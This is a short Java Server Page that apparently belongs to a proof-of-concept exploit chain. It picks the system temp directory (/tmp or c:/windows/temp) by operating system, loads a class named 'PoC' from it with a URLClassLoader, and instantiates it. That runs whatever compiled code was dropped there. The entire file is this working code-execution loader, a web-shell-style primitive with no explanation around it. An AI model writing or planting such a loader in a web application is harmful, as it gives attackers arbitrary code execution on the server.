<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    java.net.URL url;
    if (java.io.File.separator.equals("/")) {
        url = new java.net.URL("file:///tmp/");
    }else{
        url = new java.net.URL("file:///c:/windows/temp/");
    }
    java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]{url}, Thread.currentThread().getContextClassLoader());
    urlClassLoader.loadClass("PoC").newInstance();
%>